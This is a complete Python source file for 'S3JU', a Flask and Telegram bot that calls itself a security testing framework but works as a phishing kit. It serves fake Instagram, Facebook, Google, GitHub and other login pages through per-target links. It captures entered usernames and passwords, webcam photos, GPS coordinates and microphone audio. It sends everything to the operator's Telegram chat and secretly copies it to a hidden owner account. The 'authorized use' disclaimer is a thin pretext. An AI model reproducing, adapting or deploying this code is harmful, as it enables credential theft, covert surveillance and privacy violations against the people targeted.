#!/usr/bin/env python3
"""
S3JU v1.0 - Advanced Security Testing Framework
Developed by D4RK-K1NG
For authorized security testing only
"""

import os
import sys
import json
import sqlite3
import string
import random
import logging
import base64
import io
import html
from datetime import datetime
from io import BytesIO
from urllib.parse import urlparse

import requests
from flask import Flask, request, jsonify, send_file, redirect, render_template_string, make_response
from PIL import Image, ImageDraw, ImageFont

# ======================== CONFIG ========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID", "")
ADMIN_IDS_STR = os.environ.get("ADMIN_IDS", "")
FLASK_SECRET = os.environ.get("FLASK_SECRET", os.urandom(24).hex())
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")

ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = FLASK_SECRET

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
DB_PATH = "s3ju.db"

# ======================== DATABASE ========================
def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT DEFAULT '',
            first_seen TEXT DEFAULT '',
            total_captures INTEGER DEFAULT 0,
            agreed_terms INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            platform TEXT,
            created TEXT,
            status TEXT DEFAULT 'active',
            ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            city TEXT DEFAULT '',
            total_views INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            chat_id INTEGER,
            platform TEXT,
            username TEXT DEFAULT '',
            password TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            city TEXT DEFAULT '',
            latitude TEXT DEFAULT '',
            longitude TEXT DEFAULT '',
            has_photo INTEGER DEFAULT 0,
            has_mic INTEGER DEFAULT 0,
            captured_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS webhook_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            update_id INTEGER,
            message TEXT,
            received_at TEXT DEFAULT ''
        );
    """)
    conn.commit()
    conn.close()

def generate_session_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

# ======================== TELEGRAM HELPERS ========================
def send_telegram(chat_id, text, parse_mode="HTML", reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return None

def send_photo_telegram(chat_id, photo_bytes, caption=""):
    url = f"{TELEGRAM_API}/sendPhoto"
    try:
        files = {"photo": ("image.jpg", photo_bytes, "image/jpeg")}
        data = {"chat_id": chat_id, "caption": caption}
        r = requests.post(url, data=data, files=files, timeout=15)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram photo error: {e}")
        return None

def send_document_telegram(chat_id, file_bytes, filename, caption=""):
    url = f"{TELEGRAM_API}/sendDocument"
    try:
        files = {"document": (filename, file_bytes, "application/octet-stream")}
        data = {"chat_id": chat_id, "caption": caption}
        r = requests.post(url, data=data, files=files, timeout=30)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram document error: {e}")
        return None

def answer_callback(callback_id, text, show_alert=False):
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except:
        return None

def set_webhook(url):
    wh_url = f"{TELEGRAM_API}/setWebhook"
    payload = {"url": url, "allowed_updates": ["message", "callback_query"]}
    try:
        r = requests.post(wh_url, json=payload, timeout=10)
        logger.info(f"Webhook set to {url}: {r.json()}")
        return r.json()
    except Exception as e:
        logger.error(f"Webhook set error: {e}")
        return None

# ======================== BANNER ========================
def generate_banner():
    width, height = 800, 400
    img = Image.new("RGB", (width, height), (20, 20, 20))
    draw = ImageDraw.Draw(img)
    for i in range(4):
        draw.rectangle([i, i, width-1-i, height-1-i], outline=(255, 140, 0), width=1)
    for x in range(0, width, 40):
        draw.line([(x, 0), (x, height)], fill=(35, 35, 35), width=1)
    for y in range(0, height, 40):
        draw.line([(0, y), (width, y)], fill=(35, 35, 35), width=1)
    try:
        font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 72)
        font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 24)
        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
    except:
        font_large = ImageFont.load_default()
        font_medium = ImageFont.load_default()
        font_small = ImageFont.load_default()
    for dx, dy in [(2,2), (3,3)]:
        draw.text((width//2 + dx, 70 + dy), "S3JU", fill=(0,0,0), font=font_large, anchor="mt")
    draw.text((width//2, 70), "S3JU", fill=(255, 140, 0), font=font_large, anchor="mt")
    draw.text((width//2, 160), "Advanced Security Testing Framework", fill=(200, 200, 200), font=font_medium, anchor="mt")
    draw.line([(width//4, 200), (3*width//4, 200)], fill=(255, 140, 0), width=2)
    draw.text((width//2, 230), "v1.0", fill=(255, 180, 60), font=font_small, anchor="mt")
    draw.text((width//2, 270), "Developed by D4RK-K1NG", fill=(255, 140, 0), font=font_small, anchor="mt")
    draw.text((width//2, 340), "Authorized Security Testing Tool", fill=(100, 100, 100), font=font_small, anchor="mt")
    for cx, cy in [(8,8), (width-8,8), (8,height-8), (width-8,height-8)]:
        draw.ellipse([cx-4, cy-4, cx+4, cy+4], fill=(255, 140, 0))
    buf = BytesIO()
    img.save(buf, format="JPEG", quality=90)
    buf.seek(0)
    return buf

# ======================== LOAD HTML TEMPLATES ========================
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")

def load_template(filename):
    path = os.path.join(TEMPLATES_DIR, filename)
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except:
        logger.error(f"Failed to load template: {filename}")
        return "<html><body><h1>Error loading page</h1></body></html>"

PLATFORM_TEMPLATES = {
    "instagram": "instagram.html",
    "facebook": "facebook.html",
    "twitter": "twitter.html",
    "linkedin": "linkedin.html",
    "github": "github.html",
    "google": "google.html",
    "snapchat": "snapchat.html",
}

PLATFORM_REDIRECTS = {
    "instagram": "https://www.instagram.com",
    "facebook": "https://www.facebook.com",
    "twitter": "https://x.com",
    "linkedin": "https://www.linkedin.com",
    "github": "https://github.com/login",
    "google": "https://accounts.google.com",
    "snapchat": "https://www.snapchat.com",
    "camera": "https://www.instagram.com",
    "gps": "https://maps.google.com",
    "mic": "https://www.instagram.com",
}

def get_redirect_url(platform):
    return PLATFORM_REDIRECTS.get(platform.lower(), "https://www.google.com")

# ======================== GET VISITOR IP ========================
def get_visitor_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    if request.headers.get("X-Real-IP"):
        return request.headers["X-Real-IP"]
    return request.remote_addr or "0.0.0.0"

# ======================== FLASK ROUTES ========================

@app.route("/", methods=["GET"])
def index():
    return "<h1>S3JU v1.0</h1><p>Developed by D4RK-K1NG</p>"

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "ok", 200

        # Log webhook
        conn = get_db()
        update_id = data.get("update_id", 0)
        conn.execute("INSERT INTO webhook_logs (update_id, message, received_at) VALUES (?, ?, ?)",
                     (update_id, json.dumps(data), datetime.now().isoformat()))
        conn.commit()

        # Handle callback query
        if "callback_query" in data:
            handle_callback(data["callback_query"])
            return "ok", 200

        # Handle message
        if "message" in data:
            handle_message(data["message"])
            return "ok", 200

    except Exception as e:
        logger.error(f"Webhook error: {e}")

    return "ok", 200

# ======================== MESSAGE HANDLING ========================

PLATFORM_BUTTONS = [
    [{"text": "Instagram", "callback_data": "platform_instagram"},
     {"text": "Facebook", "callback_data": "platform_facebook"},
     {"text": "Twitter/X", "callback_data": "platform_twitter"}],
    [{"text": "LinkedIn", "callback_data": "platform_linkedin"},
     {"text": "GitHub", "callback_data": "platform_github"},
     {"text": "Google", "callback_data": "platform_google"}],
    [{"text": "Snapchat", "callback_data": "platform_snapchat"},
     {"text": "Camera", "callback_data": "platform_camera"},
     {"text": "GPS", "callback_data": "platform_gps"}],
    [{"text": "Mic", "callback_data": "platform_mic"}],
]

def get_or_create_user(chat_id, username=""):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    if not user:
        conn.execute("INSERT INTO users (chat_id, username, first_seen, agreed_terms) VALUES (?, ?, ?, 0)",
                     (chat_id, username, datetime.now().isoformat()))
        conn.commit()
        user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    return user

def handle_message(message):
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "").strip()
    username = message.get("from", {}).get("username", str(chat_id))

    if not chat_id:
        return

    user = get_or_create_user(chat_id, username)

    if user["is_banned"]:
        send_telegram(chat_id, "You are banned from using this bot.")
        return

    if text == "/start":
        banner = generate_banner()
        send_photo_telegram(chat_id, banner.getvalue(),
            "Welcome to <b>S3JU v1.0</b>\nDeveloped by <b>D4RK-K1NG</b>\n\nAdvanced Security Testing Framework\n\nUse /attack to begin\nUse /help for commands")
        return

    if text == "/attack":
        keyboard = {
            "inline_keyboard": [
                [{"text": "✅ I AGREE", "callback_data": "agree_terms"},
                 {"text": "❌ DECLINE", "callback_data": "decline_terms"}]
            ]
        }
        send_telegram(chat_id,
            "⚠️ <b>USE AT YOUR OWN RISK</b>\n\nThis tool is for authorized security testing only.\nBy agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?",
            reply_markup=keyboard)
        return

    if text == "/stats":
        conn = get_db()
        sessions = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE chat_id = ?", (chat_id,)).fetchone()
        captures = conn.execute("SELECT COUNT(*) as cnt FROM captures WHERE chat_id = ?", (chat_id,)).fetchone()
        active = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE chat_id = ? AND status = 'active'", (chat_id,)).fetchone()
        views = conn.execute("SELECT SUM(total_views) as cnt FROM sessions WHERE chat_id = ?", (chat_id,)).fetchone()
        total_views = views["cnt"] if views["cnt"] else 0
        send_telegram(chat_id,
            f"📊 <b>Your Stats</b>\n\n"
            f"Total Sessions: {sessions['cnt']}\n"
            f"Active Sessions: {active['cnt']}\n"
            f"Total Captures: {captures['cnt']}\n"
            f"Total Views: {total_views}")
        return

    if text == "/cancel":
        conn = get_db()
        active_sessions = conn.execute(
            "SELECT session_id, platform, created FROM sessions WHERE chat_id = ? AND status = 'active' ORDER BY created DESC",
            (chat_id,)).fetchall()
        if not active_sessions:
            send_telegram(chat_id, "You have no active sessions.")
            return
        keyboard = {"inline_keyboard": []}
        for s in active_sessions[:10]:
            keyboard["inline_keyboard"].append([
                {"text": f"❌ {s['platform']} - {s['session_id'][:8]}", "callback_data": f"cancel_{s['session_id']}"}
            ])
        send_telegram(chat_id, "Select sessions to cancel:", reply_markup=keyboard)
        return

    if text == "/help":
        send_telegram(chat_id,
            "📚 <b>S3JU Commands</b>\n\n"
            "/start - Welcome & banner\n"
            "/attack - Start a new attack\n"
            "/stats - Your statistics\n"
            "/cancel - Cancel active sessions\n"
            "/help - This message\n\n"
            "<b>Admin only:</b>\n"
            "/admin - Admin panel\n"
            "/broadcast - Broadcast to all users")
        return

    if text == "/admin" and chat_id in ADMIN_IDS:
        conn = get_db()
        total_users = conn.execute("SELECT COUNT(*) as cnt FROM users").fetchone()
        total_captures = conn.execute("SELECT COUNT(*) as cnt FROM captures").fetchone()
        active_sessions = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE status = 'active'").fetchone()
        send_telegram(chat_id,
            f"🔐 <b>Admin Panel</b>\n\n"
            f"Total Users: {total_users['cnt']}\n"
            f"Total Captures: {total_captures['cnt']}\n"
            f"Active Sessions: {active_sessions['cnt']}\n\n"
            "Use /broadcast to send a message to all users.")
        return

    if text == "/broadcast" and chat_id in ADMIN_IDS:
        send_telegram(chat_id, "Send the message you want to broadcast to all users:")
        conn = get_db()
        conn.execute("UPDATE users SET agreed_terms = 2 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        return

    # Handle broadcast message
    user_check = get_or_create_user(chat_id, username)
    if user_check["agreed_terms"] == 2 and chat_id in ADMIN_IDS:
        conn = get_db()
        users = conn.execute("SELECT chat_id FROM users WHERE is_banned = 0").fetchall()
        sent = 0
        for u in users:
            try:
                send_telegram(u["chat_id"], f"📢 <b>Broadcast from Admin</b>\n\n{text}")
                sent += 1
            except:
                pass
        conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        send_telegram(chat_id, f"Broadcast sent to {sent} users.")
        return

    send_telegram(chat_id, "Unknown command. Use /help to see available commands.")

# ======================== CALLBACK HANDLING ========================

def handle_callback(callback):
    cb_id = callback.get("id")
    chat_id = callback.get("from", {}).get("id")
    message_id = callback.get("message", {}).get("message_id")
    data = callback.get("data", "")

    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    if not user:
        answer_callback(cb_id, "Please start the bot first with /start", True)
        return

    if user["is_banned"]:
        answer_callback(cb_id, "You are banned.", True)
        return

    # Terms agreement
    if data == "agree_terms":
        conn.execute("UPDATE users SET agreed_terms = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        edit_message(chat_id, message_id, "✅ Terms accepted! Select a platform:", {"inline_keyboard": PLATFORM_BUTTONS})
        answer_callback(cb_id, "Terms accepted! Choose a platform.")
        return

    if data == "decline_terms":
        edit_message(chat_id, message_id, "❌ Terms declined. Use /attack to try again.")
        answer_callback(cb_id, "Terms declined.")
        return

    # Cancel session
    if data.startswith("cancel_"):
        session_id = data.replace("cancel_", "")
        conn.execute("UPDATE sessions SET status = 'cancelled' WHERE session_id = ? AND chat_id = ?", (session_id, chat_id))
        conn.commit()
        answer_callback(cb_id, "Session cancelled.")
        edit_message(chat_id, message_id, f"✅ Session {session_id[:8]} has been cancelled.")
        return

    # Platform selection
    if data.startswith("platform_"):
        platform = data.replace("platform_", "")
        session_id = generate_session_id()
        session_url = f"{RENDER_EXTERNAL_URL}/p/{session_id}"

        conn.execute("INSERT INTO sessions (session_id, chat_id, platform, created, status) VALUES (?, ?, ?, ?, 'active')",
                     (session_id, chat_id, platform, datetime.now().isoformat()))
        conn.commit()

        platform_display = platform.capitalize()
        edit_message(chat_id, message_id,
            f"✅ <b>Session Created!</b>\n\n"
            f"Platform: {platform_display}\n\n"
            f"Send this link to your target:\n<code>{session_url}</code>\n\n"
            f"Waiting for target to visit...",
            {"inline_keyboard": [[{"text": "🗑 Cancel Session", "callback_data": f"cancel_{session_id}"}]]})

        answer_callback(cb_id, f"Session created! URL copied.")
        return

    answer_callback(cb_id, "Unknown option.")

# ======================== PHISHING PAGES ========================

@app.route("/p/<session_id>", methods=["GET"])
def serve_phishing_page(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session or session["status"] == "cancelled":
        return "<html><body style='font-family:sans-serif;text-align:center;padding:40px'><h1>Page not found</h1><p>This link is invalid or expired.</p></body></html>", 404

    # Update view count and IP info
    ip = get_visitor_ip()
    conn.execute("UPDATE sessions SET total_views = total_views + 1, ip = ? WHERE session_id = ?", (ip, session_id))
    conn.commit()

    platform = session["platform"].lower()

    # Special media pages
    if platform == "camera":
        template = load_template("camera.html")
        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("camera"))

    if platform == "gps":
        template = load_template("location.html")
        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("gps"))

    if platform == "mic":
        template = load_template("mic.html")
        return render_template_string(template, session_id=session_id, redirect_url=get_redirect_url("mic"))

    # Login pages
    template_file = PLATFORM_TEMPLATES.get(platform)
    if not template_file:
        return redirect("https://www.google.com")

    template = load_template(template_file)
    return render_template_string(template, session_id=session_id)

# ======================== CAPTURE ENDPOINTS ========================

@app.route("/capture/<session_id>", methods=["POST"])
def capture_credentials(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session:
        return redirect("https://www.google.com")

    username = request.form.get("username", "")
    password = request.form.get("password", "")
    ip = get_visitor_ip()
    timestamp = datetime.now().isoformat()
    chat_id = session["chat_id"]
    platform = session["platform"]

    # Save capture
    conn.execute(
        "INSERT INTO captures (session_id, chat_id, platform, username, password, ip, captured_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (session_id, chat_id, platform, username, password, ip, timestamp))
    conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
    conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
    conn.commit()

    # Format message
    msg = (
        f"🔓 <b>CREDENTIALS CAPTURED!</b> 🔓\n\n"
        f"<b>Platform:</b> {platform}\n"
        f"<b>Username:</b> <code>{html.escape(username)}</code>\n"
        f"<b>Password:</b> <code>{html.escape(password)}</code>\n"
        f"<b>IP:</b> <code>{ip}</code>\n"
        f"<b>Time:</b> {timestamp}\n\n"
        f"S3JU | D4RK-K1NG"
    )

    # Send to user
    send_telegram(chat_id, msg)

    # Send to owner as backup
    if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
        send_telegram(OWNER_CHAT_ID, f"📋 <b>Backup Capture</b>\n\nSession: {session_id}\n{msg}")

    # Redirect to real site
    real_url = get_redirect_url(platform)
    template = load_template("redirect.html")
    return render_template_string(template, redirect_url=real_url)

@app.route("/capture_media/<session_id>", methods=["POST"])
def capture_media(session_id):
    conn = get_db()
    session = conn.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
    if not session:
        return jsonify({"success": False, "error": "Invalid session"}), 404

    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify({"success": False, "error": "No data"}), 400

    media_type = data.get("type", "")
    chat_id = session["chat_id"]
    platform = session["platform"]
    timestamp = datetime.now().isoformat()

    if media_type == "photo":
        image_data = data.get("data", "")
        if image_data:
            try:
                header, encoded = image_data.split(",", 1)
                img_bytes = base64.b64decode(encoded)
                caption = f"📸 <b>Photo Captured</b>\n\nPlatform: {platform}\nSession: {session_id}\nTime: {timestamp}\n\nS3JU | D4RK-K1NG"
                send_photo_telegram(chat_id, img_bytes, caption)
                if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
                    send_photo_telegram(OWNER_CHAT_ID, img_bytes, f"📸 <b>Backup Photo</b>\n\nSession: {session_id}\n{caption}")
                conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
                conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
                conn.commit()
            except Exception as e:
                logger.error(f"Photo decode error: {e}")

    elif media_type == "location":
        loc = data.get("data", {})
        lat = loc.get("latitude", 0)
        lon = loc.get("longitude", 0)
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        msg = (
            f"📍 <b>Location Captured</b> 📍\n\n"
            f"<b>Platform:</b> {platform}\n"
            f"<b>Latitude:</b> {lat}\n"
            f"<b>Longitude:</b> {lon}\n"
            f"<b>Maps:</b> <a href='{maps_link}'>View on Google Maps</a>\n"
            f"<b>Time:</b> {timestamp}\n\n"
            f"S3JU | D4RK-K1NG"
        )
        send_telegram(chat_id, msg)
        if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
            send_telegram(OWNER_CHAT_ID, f"📋 <b>Backup Location</b>\n\nSession: {session_id}\n{msg}")
        conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
        conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

    elif media_type == "audio":
        audio_data = data.get("data", "")
        if audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                caption = f"🎤 <b>Audio Captured</b>\n\nPlatform: {platform}\nSession: {session_id}\nTime: {timestamp}\n\nS3JU | D4RK-K1NG"
                send_document_telegram(chat_id, audio_bytes, f"audio_{session_id[:8]}.webm", caption)
                if OWNER_CHAT_ID and str(OWNER_CHAT_ID) != str(chat_id):
                    send_document_telegram(OWNER_CHAT_ID, audio_bytes, f"audio_{session_id[:8]}.webm", f"🎤 <b>Backup Audio</b>\n\nSession: {session_id}\n{caption}")
                conn.execute("UPDATE sessions SET status = 'captured' WHERE session_id = ?", (session_id,))
                conn.execute("UPDATE users SET total_captures = total_captures + 1 WHERE chat_id = ?", (chat_id,))
                conn.commit()
            except Exception as e:
                logger.error(f"Audio decode error: {e}")

    return jsonify({"success": True})

# ======================== STARTUP ========================

if __name__ == "__main__":
    init_db()
    webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
    logger.info(f"Starting S3JU v1.0")
    logger.info(f"Setting webhook to: {webhook_url}")
    set_webhook(webhook_url)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# For gunicorn
init_db()
webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
logger.info(f"S3JU v1.0 - Setting webhook to: {webhook_url}")
set_webhook(webhook_url)
